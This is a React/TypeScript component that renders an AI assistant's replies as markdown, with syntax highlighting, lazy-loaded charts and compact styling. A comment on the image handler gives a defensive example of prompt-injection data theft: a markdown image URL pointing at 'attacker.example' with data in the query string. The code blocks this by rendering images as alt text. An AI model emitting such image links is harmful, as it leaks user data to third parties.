"use client";
// Renders an assistant reply as markdown instead of a plain string, so
// headings, lists and prose get real line-height and sizing and a fenced code
// block gets a monospace, per-language syntax highlighter instead of a plain
// `<pre>`. Streamdown is the one place that config lives. A reply still
// streaming in (`assistant-stream-reply.tsx`) passes `streaming: true`, so an
// unterminated fence or bold marker never renders as broken HTML mid-reply
// (`parseIncompleteMarkdown`). An `oxagen-chart` fence, which `render_chart`
// hands the assistant, draws as a chart instead of code (`assistant-chart.tsx`).
import { type ComponentProps, lazy, Suspense } from "react";
import { useTranslations } from "next-intl";
import { Streamdown } from "streamdown";
import { createCodePlugin } from "@streamdown/code";
import { CHART_FENCE_LANGUAGE } from "@oxagen/oxagen/chart-spec";

/**
 * Shiki highlighting for fenced code. `[light, dark]` emits both themes as
 * inline `--shiki-light`/`--shiki-dark` CSS variables and Streamdown's
 * `dark:` Tailwind utilities pick between them off the `.dark` class on
 * `<html>`, with no JS theme detection and no flash.
 */
const codePlugin = createCodePlugin({
  themes: ["github-light", "github-dark"],
});

/**
 * The chart renderer and Recharts behind it load the first time a reply holds
 * an `oxagen-chart` fence. Every signed-in page renders the shell, which
 * imports this file, and most replies draw no chart, so a static import would
 * put Recharts in every page's first download.
 */
const AssistantChartBlock = lazy(() =>
  import("./assistant-chart").then((module) => ({
    default: module.AssistantChartBlock,
  })),
);

function ChartLoading() {
  const t = useTranslations("shell.assistant.chart");
  return (
    <p data-testid="assistant-chart-loading" className="text-muted-foreground">
      {t("drawing")}
    </p>
  );
}

function LazyChartBlock(props: ComponentProps<typeof AssistantChartBlock>) {
  return (
    <Suspense fallback={<ChartLoading />}>
      <AssistantChartBlock {...props} />
    </Suspense>
  );
}

const PLUGINS = {
  code: codePlugin,
  renderers: [{ language: CHART_FENCE_LANGUAGE, component: LazyChartBlock }],
};

/**
 * An image in a reply renders as its alt text and is never fetched. The reply
 * is model output, and a prompt injection or a tool result can steer it: an
 * `![x](https://attacker.example/?d=…)` would otherwise have the browser send
 * whatever the model put in that URL to a third party, with no confirmation.
 * Streamdown's link-safety prompt covers links, not images.
 */
function InertImage({ alt }: { alt?: string }) {
  return alt ? <span>{alt}</span> : null;
}

/**
 * 13px on a 20px line, the size the design gives an assistant message and the
 * user bubble beside it (`.msg` in the roadmap's `mockups/src/engine.css`).
 * `leading-relaxed` on top made every paragraph and list item a taller line
 * than the rest of the flyout. Streamdown keeps `space-y-4` between blocks,
 * which is the paragraph spacing this keeps.
 *
 * Streamdown sizes its headings for a page: `text-3xl` for `#`, `text-2xl`
 * for `##`, `text-xl` for `###`, with `mt-6` above each. In a 430px panel a
 * reply's `## Summary` came out twice the size of its text. Here a heading is
 * at most 15px, set apart by weight, not size. The descendant selectors
 * outrank Streamdown's single-class utilities, so they win whatever order the
 * stylesheet lists them in. Inline and fenced code step down to 12px.
 *
 * Streamdown gives each `<li>` `py-1`, so sibling items sat 8px apart on top
 * of the line-height. Halved, a list reads as one block, not a stack of
 * paragraphs.
 */
const PROSE_CLASS =
  "max-w-none text-[13px] leading-5 [&>*:first-child]:mt-0 [&>*:last-child]:mb-0 [&_h1]:mt-4 [&_h1]:mb-1.5 [&_h1]:text-[15px] [&_h1]:leading-5 [&_h2]:mt-4 [&_h2]:mb-1.5 [&_h2]:text-[14px] [&_h2]:leading-5 [&_h3]:mt-3 [&_h3]:mb-1 [&_h3]:text-[13px] [&_h3]:leading-5 [&_h4]:mt-3 [&_h4]:mb-1 [&_h4]:text-[13px] [&_h5]:text-[13px] [&_h6]:text-[13px] [&_code]:text-[12px] [&_li]:py-0.5 [&_pre]:max-w-full [&_pre]:overflow-x-auto [&_table]:block [&_table]:max-w-full [&_table]:overflow-x-auto [&_table]:text-[12.5px]";

const COMPONENTS = { img: InertImage };

export interface AssistantMarkdownProps {
  children: string;
  /** True while the reply is still streaming in (see `assistant-stream-reply.tsx`). */
  streaming?: boolean;
}

export function AssistantMarkdown({
  children,
  streaming = false,
}: AssistantMarkdownProps) {
  return (
    <Streamdown
      parseIncompleteMarkdown={streaming}
      shikiTheme={["github-light", "github-dark"]}
      components={COMPONENTS}
      plugins={PLUGINS}
      controls={{ code: { copy: true, download: false } }}
      className={PROSE_CLASS}
    >
      {children}
    </Streamdown>
  );
}
